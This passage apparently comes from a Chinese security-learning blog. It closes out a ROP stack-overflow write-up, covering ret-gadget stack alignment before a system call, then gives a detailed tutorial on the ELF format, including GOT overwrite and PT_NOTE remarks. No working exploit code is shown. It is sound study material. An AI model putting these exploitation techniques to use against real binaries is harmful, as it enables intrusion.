👆上面问题主要出在对栈帧结构理解并不透彻，RSP是随着执行汇编指令而变化的！而payload多溢出的8个bytes对RSP不会有任何影响，通过gdb调试也验证了RSP依旧不变 简单Google后发现解决办法,gadget一个return指令即可,然后在调用System 函数之前 执行ret指令使得rsp增加8满足16bytes对齐要求。 修改后代码如下 验证： 4.My Summary 工具方面：初步了解gdb工作原理，能使用gdb对程序进行调试和栈帧分析，掌握gcc编译开启相关保护，初步了解NX绕过。学会使用ROPgadgets、dmesg。 内容方面，了解PLT和GOT表的原理，掌握基本ROP栈溢出，对Pwntools底层实现原理有了初步了解，了解elf文件执行时的Env环境变量。 技能方面，通过手动调试、发现问题、实际解决”关于gdb调试中看到的buf数组首地址和调试core转储文件不一致的解释”、”64-bit程序下RSP指针对齐问题”，自主查阅资料和分析的能力得到锻炼提升(有问题就找Stackoverflow)。","categories":[{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/categories/Pwn/"}],"tags":[{"name":"Rop","slug":"Rop","permalink":"http://example.com/tags/Rop/"},{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/tags/Pwn/"}]},{"title":"linux_ELF文件格式","slug":"Linux_ELF文件","date":"2021-08-15T17:24:39.000Z","updated":"2022-03-25T13:51:43.000Z","comments":true,"path":"2021/08/16/Linux_ELF文件/","link":"","permalink":"http://example.com/2021/08/16/Linux_ELF%E6%96%87%E4%BB%B6/","excerpt":"","text":"linux_ELF在Linux环境下编译过程一文中简单的提及了linux的ELF文件格式的链接的过程，在此基础上上，本文再次探究ELF文件类型、程序头、节头、符号、重定位、动态链接的内容。 ELF文件格式ELF文件类型 目标文件有三种类型： 可重定位文件（Relocatable File）包含适合于与其他目标文件链接来创建可执行文件或者共享目标文件的代码和数据。 可执行文件（Executable File）包含适合于执行的一个程序，此文件规定了 exec() 如何创建一个程序的进程映像。 共享目标文件（Shared Object File）包含可在两种上下文中链接的代码和数据。首先链接编辑器可以将它和其它可重定位文件和共享目标文件一起处理，生成另外一个目标文件。其次，动态链接器（Dynamic Linker）可能将它与某个可执行文件以及其它共享目标一起组合，创建进程映像。 一个更清晰易懂的ELF格式： 文件开始处是一个ELF 头部（ELF Header），用来描述整个文件的组织。节区部分包含链接视图的大量信息：指令、数据、符号表、重定位信息等等。 程序头部表（Program Header Table），如果存在的话，告诉系统如何创建进程映像。用来构造进程映像的目标文件必须具有程序头部表，可重定位文件不需要这个表。 节区头部表（Section Heade Table）包含了描述文件节区的信息，每个节区在表中都有一项，每一项给出诸如节区名称、节区大小这类信息。用于链接的目标文件必须包含节区头部表，其他目标文件可以有，也可以没有这个表。 ELF Header12345678910111213141516171819#define EI_NIDENT (16)typedef struct&#123; unsigned char e_ident[EI_NIDENT]; /* Magic number and other info */ Elf32_Half e_type; /* Object file type */ Elf32_Half e_machine; /* Architecture */ Elf32_Word e_version; /* Object file version */ Elf32_Addr e_entry; /* Entry point virtual address */ Elf32_Off e_phoff; /* Program header table file offset */ Elf32_Off e_shoff; /* Section header table file offset */ Elf32_Word e_flags; /* Processor-specific flags */ Elf32_Half e_ehsize; /* ELF header size in bytes */ Elf32_Half e_phentsize; /* Program header table entry size */ Elf32_Half e_phnum; /* Program header table entry count */ Elf32_Half e_shentsize; /* Section header table entry size */ Elf32_Half e_shnum; /* Section header table entry count */ Elf32_Half e_shstrndx; /* Section header string table index */&#125; Elf32_Ehdr; 上述的Elf32_Half定义 12/* Type for a 16-bit quantity. */typedef uint16_t Elf32_Half; 其中Elf32_Word的定义 12/* Types for signed and unsigned 32-bit quantities. */typedef uint32_t Elf32_Word; 然后Elf32_Addr与Elf32_Off定义 12345/* Type of addresses. */typedef uint32_t Elf32_Addr;/* Type of file offsets. */typedef uint32_t Elf32_Off; e_ident[EI_NIDENT] 文件的标识以及标识描述了elf如何编码等信息。 1Magic： 7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 关于该结构体的索引可以看下面的表格： 名称 取值 目的 EI_MAG0 0 文件标识(0x7f) EI_MAG1 1 文件标识(E) EI_MAG2 2 文件标识(L) EI_MAG3 3 文件标识(F) EI_CLASS 4 文件类 EI_DATA 5 数据编码 EI_VERSION 6 文件版本 EI_PAD 7 补齐字节开始处 EI_NIDENT 16 e_ident[]大小 e_type 该数据类型是uint16_t数据类型的，占两个字节。通过字段查看，可以看到这个值为00 02。表格定义如下： 名称 取值 含义 ET_NONE 0x0000 未知目标文件格式 ET_ERL 0x0001 可重定位文件 ET_EXEC 0x0002 可执行文件 ET_DYN 0x0003 共享目标文件 ET_CORE 0x0004 Core文件(转储格式) ET_LOPROC 0xff00 特定处理器文件 ET_HIPROC 0xffff 特定处理器文件 e_machine 由字段可以看到为00 28，关于这个字段的解析，基本上就是表示该elf文件是针对哪个处理器架构的。 下面只列出几个常见的架构的序号 名称 取值 含义 EM_NONE 0 No machine EM_SPARC 2 SPARC EM_386 3 Intel 80386 EM_MIPS 8 MIPS I Architecture EM_PPC 0x14 PowerPC EM_ARM 0x28 Advanced RISC Machines ARM e_version 该字段占四个字节，表示当前文件版本的信息。现在取值为00 00 00 01。从取值上来看 名称 取值 含义 EV_NONE 0 非法版本 EV_CURRENT 1 当前版本 e_entry 这里表示程序的入口地址，目前为四字节，所以通过字段解析到的内容为00 00 80 00。得到可执行程序的入口地址为0x8000。 e_phoff 该字段表示程序表头偏移。占四个字节，根据字段解析，可以查看当前的偏移量为00 00 00 34。也就是实际的偏移量为52个字节。这52个字节其实就是头部的信息数据结构体的大小。 e_shoff 该区域比较重要，记录了section的偏移地址。为四字节，解析出来的字段为0x00 04 24 5c。所以得到地址为0x4245c。 e_ehsize elf文件的头部大小。该取值与头文件结构体的大小相关 e_phnum 目前取值为00 01，这里表示程序头的个数当前只有一个程序头，如果有多个程序头表，那么会在elf头文件之后，也就是52个字节之后，依次向下排列。因为这里是1，所以只有1个程序头。 以下位64位ELF文件头内容 12345678910111213141516171819202122ubuntu@ubuntu:~/code/c_code$ gcc -g test.c -o testubuntu@ubuntu:~/code/c_code$ readelf -h testELF Header: Magic: 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 Class: ELF64 Data: 2&#x27;s complement, little endian Version: 1 (current) OS/ABI: UNIX - System V ABI Version: 0 Type: DYN (Shared object file) Machine: Advanced Micro Devices X86-64 Version: 0x1 Entry point address: 0x530 Start of program headers: 64 (bytes into file) Start of section headers: 8648 (bytes into file) Flags: 0x0 Size of this header: 64 (bytes) Size of program headers: 56 (bytes) Number of program headers: 9 Size of section headers: 64 (bytes) Number of section headers: 34 Section header string table index: 33 以上是ELF_Header部分 关于程序头部(Program Header)将在程序加载和动态链接部分介绍 ELF节区（Sections）节区中包含目标文件中的所有信息，除了：ELF头部、程序头部表格、节区头部表格。节区满足以下条件： (1).目标文件中的每个节区都有对应的节区头部描述它，反过来，有节区头部不意味着有节区。 (2).每个节区占用文件中一个连续字节区域（这个区域可能长度为 0）。 (3).文件中的节区不能重叠，不允许一个字节存在于两个节区中的情况发生。 (4).目标文件中可能包含非活动空间（INACTIVE SPACE）。这些区域不属于任何头部和节区，其内容未指定。 这里引入节(section)和段(segment)的区别: 段是程序执行的必要组成成分。 每个段中，会有代码或数据被划分为不同的节。 节头表是对这些节位置和大小的描述，主要用于链接和调试。对于程序执行来说是非必须的，没有节头表程序一九可以正常执行，因为节头表没有对程序内存布局进行布局，对程序布局的描述是程序头表的任务。 如果二进制文件中缺少节头，并不意味着节就不存在。只是没有办法通过节头来引用节，对于调试器或者反编译程序来说，只是可以参考的信息变少了而已。 每一个节都保存了某种类型的代码或者数据。数据可以是程序中的全局变量，也可以是链接器所需要的动态链接信息。正如前面提到的，每个ELF目标文件都有节，但是不一定有节头，尤其是有人故意将节头从节头表中删除了之后。当然，默认是有节头的。 节区头部数据结构如下： 12345678910111213typedef struct&#123; Elf32_Word sh_name; /* Section name (string tbl index) */ Elf32_Word sh_type; /* Section type */ Elf32_Word sh_flags; /* Section flags */ Elf32_Addr sh_addr; /* Section virtual addr at execution */ Elf32_Off sh_offset; /* Section file offset */ Elf32_Word sh_size; /* Section size in bytes */ Elf32_Word sh_link; /* Link to another section */ Elf32_Word sh_info; /* Additional section information */ Elf32_Word sh_addralign; /* Section alignment */ Elf32_Word sh_entsize; /* Entry size if section holds table */&#125; Elf32_Shdr; 重要字段： sh_flags 字段 sh_flags字段定义了一个节区中包含的内容是否可以修改、是否可以执行等信息。如果一个标志位被设置，则该位取值为1。未定义的各位都设置为0。 取值如下 12345#define PF_X (1 &lt;&lt; 0) /* Segment is executable */#define PF_W (1 &lt;&lt; 1) /* Segment is writable */#define PF_R (1 &lt;&lt; 2) /* Segment is readable */#define PF_MASKOS 0x0ff00000 /* OS-specific */#define PF_MASKPROC 0xf0000000 /* Processor-specific */ 下面介绍几个重要的节 .text 节 .text节是保存了程序代码指令的代码节。一段可执行程序，如果存在Phdr，.text节就会存在于text段中。由于.text节保存了程序代码，因此节的类型为SHT_PROGBITS。 .rodata 节 .rodata节保存了只读的数据，如一行C语言代码中的字符串。下面这条命令就是存放在.rodata节中的：printf(“Hello World!\\n”); 因为.rodata节是只读的，所以只能存在于一个可执行文件的只读段中。因此，只能在text段（不是data段）中找到.rodata节。由于.rodata节是只读的，因此节类型为SHT_PROGBITS。 .plt 节 本文在动态链接的过程链接表（Procedure Linkage Table，PLT）进行详细介绍。.plt节中包含了动态链接器调用从共享库导入的函数所必需的相关代码。由于其存在于text段中，同样保存了代码，因此节类型为SHT_PROGBITS。 .data 节 不要将.data节和data段混淆了，.data节存在于data段中，保存了初始化的全局变量等数据。由于其保存了程序的变量数据，因此类型被标记为SHT_PROGBITS。 .bss 节 .bss节保存了未进行初始化的全局数据，是data段的一部分，占用空间不超过4字节，仅表示这个节本身的空间。程序加载时数据被初始化为0，在程序执行期间可以进行赋值。由于.bss节未保存实际的数据，因此节类型为SHT_NOBITS。 .got.plt 节 .got节保存了全局偏移表。.got节和.plt节一起提供了对导入的共享库函数的访问入口，由动态链接器在运行时进行修改。如果攻击者获得了堆或者.bss漏洞的一个指针大小的写原语，就可以对该节任意进行修改。我们将在本问的ELF动态链接部分对此进行讨论。.got.plt节跟程序执行有关，因此节类型被标记为SHT_PROGBITS。 .dynsym 节 .dynsym节保存了从共享库导入的动态符号信息，该节保存在text段中，节类型被标记为SHT_DYNSYM。 .dynstr 节 .dynstr节保存了动态符号字符串表，表中存放了一系列字符串，这些字符串代表了符号的名称，以空字符作为终止符。 .rel.*节 重定位节保存了重定位相关的信息，这些信息描述了如何在链接或者运行时，对ELF目标文件的某部分内容或者进程镜像进行补充或修改。在本文重定位部分会深入讨论。重定位节保存了重定位相关的数据，因此节类型被标记为SHT_REL。 .hash节 .hash节有时也称为.gnu.hash，保存了一个用于查找符号的散列表。 下面的散列算法是用来在Linux ELF文件中查找符号名的： 123456789uint32.t dl_new_hash(const char *s) &#123; uint32_t h = 5381; for(unsigned char c = *s;c != &#x27;\\0&#x27;; c = *++s) h = h * 33 + c;//Or h = ((h &lt;&lt; 5) + h) + c return h; &#125; .symtab节 .symtab节保存了ElfN_Sym类型的符号信息，本文将在ELF符号和重定位部分详细介绍。.symtab节保存了符号信息，因此节类型被标记为SHT_SYMTAB。 .strtab节 .strtab节保存的是符号字符串表，表中的内容会被.symtab的ElfN_Sym结构中的st_name条目引用。由于其保存了字符串表，因此节类型被标记为SHT_STRTAB。 这部分内容在ELF符号具体展开介绍 .shstrtab节 .shstrtab节保存节头字符串表，该表是一个以空字符终止的字符串的集合，字符串保存了每个节的节名，如.text、.data等。有一个名为e_shsrndx的ELF文件头条目会指向.shstrtab节，e_shstrndx中保存了.shstrtab的偏移量。由于其保存了字符串表，因此节类型被标记为SHT_STRTAB。 字符串表节区包含以NULL（ASCII码0）结尾的字符序列，通常称为字符串。ELF目标文件通常使用字符串来表示符号和节区名称。对字符串的引用通常以字符串在字符串表中的下标给出。 一般，第一个字节（索引为 0）定义为一个空字符串。类似的，字符串表的最后一个字节也定义为 NULL，以确保所有的字符串都以NULL结尾。索引为0的字符串在不同的上下文中可以表示无名或者名字为 NULL的字符串。 允许存在空的字符串表节区，其节区头部的sh_size成员应该为0。对空的字符串表而言，非0的索引值是非法的。 例如：对于各个节区而言，节区头部的sh_name成员包含其对应的节区头部字符串表节区的索引，此节区由ELF 头的e_shstrndx 成员给出。下图给出了包含 25 个字节的一个字符串表，以及与不同索引相关的字符串。 Demo: 表中包含的字符串如下： 索引 字符串 0 无 1 name. 7 Variable 11 able 16 able 24 空字符串 在使用、分析字符串表时，要注意以下几点： 字符串表索引可以引用节区中任意字节。 字符串可以出现多次 可以存在对子字符串的引用 一个字符串可以被引用多次。 字符串表中也可以存在未引用的字符串。 .ctors和.dtors节 .ctors（构造器）和.dtors（析构器）这两个节保存了指向构造函数和析构函数的函数指针，构造函数是在main函数执行之前需要执行的代码，析构函数是在main函数之后需要执行的代码。 ELF程序头(Program Header)&amp;段(Segment)执行时ELF视图：可以看到程序头的位置,Segmen段和Section节的映射关系 What’s Program header? ELF程序头是对二进制文件中段的描述，是程序装载必需的一部分。段（segment）是在内核装载时被解析的，描述了磁盘上可执行文件的内存布局以及如何映射到内存中。可以通过引用原始ELF头中名为e_phoff（程序头表偏移量）的偏移量来得到程序头表，如前面ElfN_Ehdr结构中所示。 可执行文件或者共享目标文件的程序头部是一个结构数组，每个结构描述了一个段或者系统准备程序执行所必需的其它信息。目标文件的“段”包含一个或者多个“节区”，也就是“段内容（Segment Contents）”。程序头部仅对于可执行文件和共享目标文件有意义。 结构体定义如下 1234567891011typedef struct&#123; Elf32_Word p_type; /* Segment type */ Elf32_Off p_offset; /* Segment file offset 相对于ELF文件开头 */ Elf32_Addr p_vaddr; /* Segment virtual address */ Elf32_Addr p_paddr; /* Segment physical address */ Elf32_Word p_filesz; /* Segment size in file */ Elf32_Word p_memsz; /* Segment size in memory */ Elf32_Word p_flags; /* Segment flags */ Elf32_Word p_align; /* Segment alignment对齐方式 */&#125; Elf32_Phdr; p_type表示segment的类型。它的可能值如下所示： 1234567891011121314151617181920#define PT_NULL 0 /* Program header table entry unused */#define PT_LOAD 1 /* Loadable program segment */#define PT_DYNAMIC 2 /* Dynamic linking information */#define PT_INTERP 3 /* Program interpreter */#define PT_NOTE 4 /* Auxiliary information */#define PT_SHLIB 5 /* Reserved */#define PT_PHDR 6 /* Entry for header table itself */#define PT_TLS 7 /* Thread-local storage segment */#define PT_NUM 8 /* Number of defined types */#define PT_LOOS 0x60000000 /* Start of OS-specific */#define PT_GNU_EH_FRAME 0x6474e550 /* GCC .eh_frame_hdr segment */#define PT_GNU_STACK 0x6474e551 /* Indicates stack executability */#define PT_GNU_RELRO 0x6474e552 /* Read-only after relocation */#define PT_LOSUNW 0x6ffffffa#define PT_SUNWBSS 0x6ffffffa /* Sun Specific segment */#define PT_SUNWSTACK 0x6ffffffb /* Stack segment */#define PT_HISUNW 0x6fffffff#define PT_HIOS 0x6fffffff /* End of OS-specific */#define PT_LOPROC 0x70000000 /* Start of processor-specific */#define PT_HIPROC 0x7fffffff /* End of processor-specific */ p_flags表示segment的标志。它的可能取值如下所示： 12345#define PF_X (1 &lt;&lt; 0) /* Segment is executable */#define PF_W (1 &lt;&lt; 1) /* Segment is writable */#define PF_R (1 &lt;&lt; 2) /* Segment is readable */#define PF_MASKOS 0x0ff00000 /* OS-specific */#define PF_MASKPROC 0xf0000000 /* Processor-specific */ 程序头可分为以下几种 下面介绍5种常见的程序头类型： 1.PT_LOAD 一个可执行文件至少有一个PT_LOAD类型的段。这类程序头描述的是可装载的段，也就是说，这种类型的段将被装载或者映射到内存中。 例如，一个需要动态链接的ELF可执行文件通常包含以下两个可装载的段（类型为PT_LOAD）： 存放程序代码的text段； 存放全局变量和动态链接信息的data段。 上面的两个段将会被映射到内存中，并根据p_align中存放的值在内存中对齐。Phdr结构体中的变量描述了段在文件和内存的布局。 2.PT_DYNAMIC——动态段的 Phdr 动态段是动态链接可执行文件所特有的，包含了动态链接器所必需的一些信息。在动态段中包含了一些标记值和指针，包括但不限于以下内容： 运行时需要链接的共享库列表； 全局偏移表（GOT）的地址——ELF动态链接部分会讨论； 重定位条目的相关信息。 下面是完整的标记名列表 标记名 标记描述 DT_SYMTAB 符号表地址 DT_RELA 相对地址重定位表的地址 DT_RELASZ Rela表的字节大小 DT_RELAENT Rela表条目的字节大小 DT_STRSZ 字符串表的字节大小 DT_SYMENT 符号表条目的字节大小 DT_INIT 初始化函数的地址 DT_FINI 终止函数的地址 DT_SONAME 共享目标文件名的字符串表偏移量 DT_RPATH 库搜索路径的字符串表偏移量 DT_SYMBOLIC 修改链接器，在可执行文件之前的共享目标文件中搜索符号 DT_REL Rel relocs表的地址 DT_RELSZ Rel表的字节大小 DT_RELENT Rel表条目的字节大小 DT_PLTREL PLT引用的reloc类型（Rela或Rel） DT_DEBUG 还未进行定义，为调试保留 DT_TEXTREL 缺少此项表明重定位只能应用于可写段 DT_JMPREL 仅用于PLT的重定位条目地址 DT_BIND_NOW 指示动态链接器在将控制权交给可执行文件之前处理所有的重定位 DT_RUNPATH 库搜索路径的字符串表偏移量 动态段包含了一些结构体，在这些结构体中存放着与动态链接相关的信息。d_tag成员变量控制着d_un的含义。 结构体定义如下： 12345678typedef struct&#123; Elf32_Sword d_tag; union&#123; Elf32_Word d_val; Elf32_Addr d_ptr; &#125;d_un; &#125; Elf32_Dyn; extern Elf32_Dyn _DYNAMIC[]; 这部分内容在动态链接部分深入讨论 PT_NOTE PT_NOTE类型的段可能保存了与特定供应商或者系统相关的附加信息。下面是标准ELF规范中对PT_NOTE的定义： 有时供应商或者系统构建者需要在目标文件上标记特定的信息，以便于其他程序对一致性、兼容性等进行检查。SHT_NOTE类型的节（section）和PT_NOTE类型的程序头元素就可以用于这一目的。节或者程序头元素中的备注信息可以有任意数量的条目，每个条目都是一个4字节的目标处理器格式的数组。下面的标签可以解释备注信息的组织结构，不过这些标签并不是规范中的内容。 Tips:这一段值保存了操作系统的规范信息，因为系统会假设一个可执行文件就是本地运行的，可执行文件运行时是不需要这个段的。So this part is vulnerable.:) 4.PT_INTERP PT_INTERP段只将位置和大小信息存放在一个以null为终止符的字符串中，是对程序解释器位置的描述。例如，/lib/linux-ld.so.2一般是指动态链接器的位置，也即程序解释器的位置。 5.PT_PHDR PT_PHDR段保存了程序头表本身的位置和大小。Phdr表保存了所有的Phdr对文件（以及内存镜像）中段的描述信息。 至此我们以及了解了节Section和段Segment,下面简单做个小结比较节和段的不同 段是程序执行的必要组成部分，在每个段中，会有代码或者数据被划分为不同的节。节头表是对这些节的位置和大小的描述，主要用于链接和调试。节头对于程序的执行来说不是必需的，没有节头表，程序仍可以正常执行，因为节头表没有对程序的内存布局进行描述，对程序内存布局的描述是程序头表的任务。节头是对程序头的补充。readelf –l命令可以显示一个段对应有哪些节，可以很直观地看到节和段之间的关系。 如果二进制文件中缺少节头，并不意味着节就不存在。只是没有办法通过节头来引用节，对于调试器或者反编译程序来说，只是可以参考的信息变少了而已。 section：告诉链接器一个部分是否： 要加载到存储器中的原始数据，例如.data，.text等. 或其他部分的格式化元数据，将由链接器使用，但在运行时消失，例如.symtab，.srttab，.rela.text segment：告诉操作系统： 应将段加载到虚拟内存中的哪个位置 段具有哪些权限（读取，写入，执行） 下面用一张图来做个总结，直观地理解ELF_Header、Section、Segment、Phdr、Shdr之间的映射关系 在了解了ELF_Header、Section、Segment、Program_Header而基础上，我们再来介绍ELF符号 ELF符号&amp;重定位符号 符号是对某些类型的数据或者代码（如全局变量或函数）的符号引用。例如，printf()函数会在动态符号表.dynsym中存有一个指向该函数的符号条目。在大多数共享库和动态链接可执行文件中，存在两个符号表。如前面使用readelf –S命令输出的内容中，可以看到有两个节：.dynsym和.symtab。 .dynsym保存了引用来自外部文件符号的全局符号，如printf这样的库函数，.dynsym保存的符号是.symtab所保存符号的子集，.symtab中还保存了可执行文件的本地符号，如全局变量，或者代码中定义的本地函数等。因此，.symtab保存了所有的符号，而.dynsym只保存动态/全局符号。 既然.symtab中保存了.dynsym中所有的符号，那么为什么还需要两个符号表呢？使用readelf –S命令查看可执行文件的输出，可以看到一部分节被标记为了A（ALLOC）、WA（WRITE/ALLOC）或者AX（ALLOC/EXEC）。.dynsym是被标记了ALLOC的，而.symtab则没有标记。 ALLOC表示有该标记的节会在运行时分配并装载进入内存，而.symtab不是在运行时必需的，因此不会被装载到内存中。.dynsym保存的符号只能在运行时被解析，因此是运行时动态链接器所需要的唯一符号。.dynsym符号表对于动态链接可执行文件的执行来说是必需的，而.symtab符号表只是用来进行调试和链接的，有时候为了节省空间，会将.symtab符号表从生产二进制文件中删掉。 下面介绍ELF文件符号项结构(32位为例): 123456789typedef struct&#123; Elf32_Word st_name; /* Symbol name (string tbl index) */ Elf32_Addr st_value; /* Symbol value */ Elf32_Word st_size; /* Symbol size */ unsigned char st_info; /* Symbol type and binding */ unsigned char st_other; /* Symbol visibility */ Elf32_Section st_shndx; /* Section index */&#125; Elf32_Sym; 字段 说明 st_name 包含目标文件符号字符串表的索引，其中包含符号名的字符串表示。如果该值非 0，则它表示了给出符号名的字符串表索引，否则符号表项没有名称。注：外部 C 符号在 C 语言和目标文件的符号表中具有相同的名称。 st_value 此成员给出相关联的符号的取值。依赖于具体的上下文，它可能是一个绝对值、一个地址等等。 st_size 很多符号具有相关的尺寸大小。例如一个数据对象的大小是对象中包含的字节数。如果符号没有大小或者大小未知，则此成员为 0。 st_info 此成员给出符号的类型和绑定属性。下面给出若干取值和含义的绑定关系。 st_other 该成员当前包含 0，其含义没有定义。 st_shndx 每个符号表项都以和其他节区间的关系的方式给出定义。此成员给出相关的节区头部表索引。某些索引具有特殊含义 关于st_info的详细说明： t_info指定符号类型及绑定属性。操纵方式如下： 123#define ELF32_ST_BIND(i) ((i)&gt;&gt;4)#define ELF32_ST_TYPE(i) ((i)&amp;0xf) #define ELF32_ST_INFO(b, t) (((b)&lt;&lt;4) + ((t)&amp;0xf)) st_info的低四位表示符号绑定 可以查阅ELF手册来查看完整的类型以属性列表。符号类型以STT开头，符号绑定以STB开头，下面对几种常见的符号类型和符号绑定进行介绍。 1．符号类型 下面是几种符号类型。 STT_NOTYPE：符号类型未定义。 STT_FUNC：表示该符号与函数或者其他可执行代码关联。 STT_OBJECT：表示该符号与数据目标文件关联 2.符号绑定:用于确定链接可见性和行为 名称 取值 说明 STB_LOCAL 0 局部符号在包含该符号定义的目标文件以外不可见。相同名称的局部符号可以存在于多个文件中，互不影响。 STB_GLOBAL 1 全局符号对所有将组合的目标文件都是可见的。一个文件中对某个全局符号的定义将满足另一个文件对相同全局符号的未定义引用。 STB_WEAK 2 弱符号与全局符号类似，不过他们的定义优先级比较低。 STB_LOPROC 13 处于这个范围的取值是保留给处理器专用语义的。 STB_HIPROC 15 处于这个范围的取值是保留给处理器专用语义的。 全局符号与弱符号之间的区别主要有两点： (1).当链接编辑器组合若干可重定位的目标文件时，不允许对同名的STB_GLOBAL 符号给出多个定义。 另一方面如果一个已定义的全局符号已经存在，出现一个同名的弱符号并不会产生错误。链接编辑器尽关心全局符号，忽略弱符号。 类似地，如果一个公共符号（符号的 st_shndx 中包含 SHN_COMMON），那么具有相同名称的弱符号出现也不会导致错误。链接编辑器会采纳公共定义，而忽略弱定义。 (2).当链接编辑器搜索归档库（archive libraries）时，会提取那些包含未定义全局符号的档案成员。成员的定义可以是全局符号，也可以是弱符号。连接编辑器不会提取档案成员来满足未定义的弱符号。 未能解析的弱符号取值为0。 在每个符号表中，所有具有 STB_LOCAL绑定的符号都优先于弱符号和全局符号。符号表节区中的 sh_info 头部成员包含第一个非局部符号的符号表索引。 🙂有点不太懂，涉及这部分的内容需要回头在看 重定位 重定位就是将符号定义和符号引用进行连接的过程。可重定位文件需要包含描述如何修改节内容的相关信息，从而使得可执行文件和共享目标文件能够保存进程的程序镜像所需的正确信息。重定位条目就是我们上面说的相关信息。 我们首先介绍了符号和节相关的内容，因为接下来要讨论的重定位过程需要依赖符号和节。在重定位文件中，重定位记录保存了如何对给定的符号对应代码进行补充的相关信息。重定位实际上是一种给二进制文件打补丁的机制，如果使用了动态链接器，可以使用重定位在内存中打热补丁（hotfix）。用于创建可执行文件和共享库的链接程序/bin/ld，需要某种类型的元数据来描述如何对特定的指令进行修改。这种元数据就存放在前面提到的重定位记录中。 举个栗子: 假设要将两个目标文件链接到一起产生一个可执行文件。obj1.o文件中存放了调用函数foo()的代码，而函数foo()是存放在目标文件obj2.o中的。链接程序会对obj1.o和obj2.o中的重定位记录进行分析并将这两个文件链接在一起产生一个可以独立运行的可执行程序。符号引用会被解析成符号定义，这是什么意思呢？目标文件是可重定位的代码，也就是说，目标文件中的代码会被重定位到可执行文件的段中一个给定的地址。在进行重定位之前，无法确定obj1.o或者obj2.o中的符号和代码在内存中的位置，因此无法进行引用。只能在链接器确定了可执行文件的段中存放的指令或者符号的位置之后才能够进行修改。 重定位表 下面是重定位表项的数据结构（32位为例） 123456789typedef struct &#123; Elf32_Addr r_offset; Elf32_Word r_info; &#125; Elf32_Rel; typedef struct &#123; Elf32_Addr r_offset; Elf32_Word r_info; Elf32_Word r_addend; &#125; Elf32_Rela 重定位表字段说明 成员 说明 r_offset 此成员给出了重定位动作所适用的位置。对于一个可重定位文件而言，此值是从节区头部开始到将被重定位影响的存储单位之间的字节偏移。对于可执行文件或者共享目标文件而言，其取值是被重定位影响到的存储单元的虚拟地址。 r_info 此成员给出要进行重定位的符号表索引，以及将实施的重定位类型。例如一个调用指令的重定位项将包含被调用函数的符号表索引。如果索引是 STN_UNDEF，那么重定位使用 0 作为“符号值”。重定位类型是和处理器相关的。当程序代码引用一个重定位项的重定位类型或者符号表索引，则表示对表项的 r_info 成员应用 ELF32_R_TYPE 或者 ELF32_R_SYM 的结果。 r_addend 此成员给出一个常量补齐，用来计算将被填充到可重定位字段的数值 重定位节区会引用两个其它节区：符号表、要修改的节区。节区头部的sh_info和sh_link成员给出这些关系。不同目标文件的重定位表项对r_offset成员具有略微不同的解释。 (1).在可重定位文件中，r_offset中包含节区偏移。就是说重定位节区自身描述了如何修改文件中的其他节区；重定位偏移 指定了被修改节区中的一个存储单元。 (2).在可执行文件和共享的目标文件中，r_offset中包含一个虚拟地址。为了使得这些文件的重定位表项对动态链接器更为有用，节区偏移（针对文件的解释）让位于虚地址（针对内存的解释）。 尽管对 r_offset 的解释会有少许不同，重定位类型的含义始终不变。 重定位类型 重定位表项描述如何修改后面的指令和数据字段。一般，共享目标文件在创建时，其基本虚拟地址是0，不过执行地址将随着动态加载而发生变化。 重定位的过程按照如下标记： A 用来计算可重定位字段的取值的补齐 B 共享目标在执行过程中，重定位项的符号的地址所处的位置 —全局偏移表的索引 GOT 全局偏移表(GOT)的地址 L 某个符号的过程链接表项的位置（节区偏移地址）。过程连接表项把函数调用重定位到正确的目标位置。链接编辑器构造初始的过程链接表，动态链接器在执行过程中修改这些项目。 P 存储单位被重定位（用r_offset计算）到的位置（节区偏移或者地址） S 其索引位于重定位表项中的符号取值 重定位项的 r_offset 取值给定受影响的存储单位的第一个字节的偏移或者虚拟地址。重定位类型给出那些位需要修改以及如何计算它们的取值。 SYSTEM V仅使用Elf32_Rel重定位表项，在被重定位的字段中包含补齐量。补齐量和计算结果始终采用相同的字节顺序。 X86体系结构下常见重定位类型： 名称 数值 字段 计算 说明 R_386_NONE 0 none none R_386_32 1 word32 S+A R_386_PC32 2 word32 S+A-P R_386_GOT32 3 word32 G+A-P 此重定位类型计算从全局偏移表基址到符号的全局偏移表项之间的距离。它会通知连接编辑器构造一个全局偏移表。 R_386_PLT32 4 word32 L+A-P 此重定位类型计算符号的过程链接表项的地质，并通知链接编辑器构造一个过程链接表。 R_386_COPY 5 word32 none 链接编辑器创建这种重定位类型的目的是支持动态链接。其偏移量成员引用某个可写段中的某个位置。符号表索引规定符号应该既存在于当前目标文件中，也存在于某个共享目标中。在执行过程中，动态链接器把与共享目标的符号相关的数据复制到由偏移给出的位置。 R_386_GLOB_DAT 6 word32 S 此重定位类型用来把某个全局偏移表项设置为给定符号的地址。这种特殊的重定位类型允许确定符号与全局偏移表项之间的关系。 R_386_JMP_SLOT 7 word32 S 链接编辑器创建这种重定位类型主要是为了支持动态链接。其偏移地址成员给出过程链接表项的位置。动态链接器修改过程链接表项的内容，把控制传输给指定符号的地址。 R_386_RELATIVE 8 word32 B+A 链接编辑器创建这种重定位类型是为了支持动态链接。其偏移地址成员给出共享目标中的一个位置，在该位置包含了代表相对地址的一个数值。动态链接器通过把共享目标被加载到的虚地址和相对地址相加，计算对应的虚地址。这种类型的重定位项必须设置符号表索引为 0。 R_386_GOTOFF 9 word32 S+A-GOT 这种重定位类型会计算符号取值与全局偏移表地址间的差。并通知链接编辑器创建一个全局偏移表。 R_386_GOTPC 10 word32 GOT+A-P 此重定位类型与 R386_PC32 类似，只不过它在计算时采用全局偏移表的地址。在此重定位项中引用的符号通常是_GLOBAL_OFFSET_TABLE，这种类型也会暗示连接编辑器构造全局偏移表。 程序加载和动态链接这部分内容将符号、重定位和节在ELF格式文件的同一个抽象层次上紧密联系起来。 程序加载 进程除非在执行过程中引用到相应的逻辑页面，否则不会请求真正的物理页面。进程通常会包含很多未引用的页面，因此，延迟物理读操作通常会避免这类费力不讨好的事情发生，从而提高系统性能。要想实际获得这种效率，可执行文件和共享目标文件必须具有这样的段：其文件偏移和虚拟地址对页面大小取模后余数相同 Demo: ​ 可执行文件布局示例 该可执行文件头部段示例如下： 这个例子中，至多四个文件页面包含非纯粹的正文或数据 第一个页面包含ELF头部、程序头部表以及其他信息 最后一个页面包含数据开始部分的一个副本 第一数据页面包含正文段的末尾部分 最后一个数据页面可能包含与运行进程无关的文件信息 